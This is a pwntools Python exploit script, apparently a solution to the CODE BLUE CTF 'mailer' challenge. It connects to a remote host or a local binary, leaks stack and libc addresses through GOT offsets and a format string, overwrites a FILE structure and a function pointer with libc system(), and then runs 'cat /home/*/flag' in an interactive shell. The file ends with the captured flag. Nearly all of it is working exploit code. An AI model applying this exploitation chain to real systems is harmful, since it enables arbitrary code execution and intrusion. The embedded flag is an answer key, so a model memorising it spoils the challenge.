#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *   # pip install pwntools
context.arch = "i386"

if "remote" in sys.argv:
    r = remote("sms.tasks.ctf.codeblue.jp", 6029)
else:
    r = process("./mailer", env={"LD_PRELOAD": "./libc.so.6"})

libc = ELF("./libc.so.6")
elf =  ELF("./mailer")

def add(content):
    r.sendlineafter("> ", "1")
    r.sendlineafter("Input your contents: ", content)

def delete(id):
    r.sendlineafter("> ", "2")
    r.sendlineafter("ID (0-4): ", str(id))

def post(id, filter):
    r.sendlineafter("> ", "3") 
    r.sendlineafter("ID (0-4): ", str(id))
    r.sendlineafter("> ", str(filter))

add(p32(0x80486D9))

# leak stack
post(0, (elf.got["setbuf"]-0x804B048)/4)
post(0, (elf.got["puts"]-0x804B048)/4)
leak = u32(r.recvline()[4:8])
log.info(hex(leak))

# overwrite FILE
post(0, (leak-0x804B048-0x100000000)/4)
r.sendline("/bin/sh;%399$x")

# leak libc
post(0, (elf.got["printf"]-0x804B048)/4)
libc_base = int(r.recvline().split(";")[1],16) - 0x1ec918 + 0x9000
log.info("libc_base=" + hex(libc_base))

# call system
libc_system = libc_base + libc.symbols["system"]
delete(0)
add(p32(libc_system))
post(0, (leak-0x804B048-0x100000000)/4)

r.sendline("cat /home/*/flag")
r.interactive()

# CBCTF{4R3_YOU_w4RM3D_UP_f0R_MORE_PWNabLeS?}
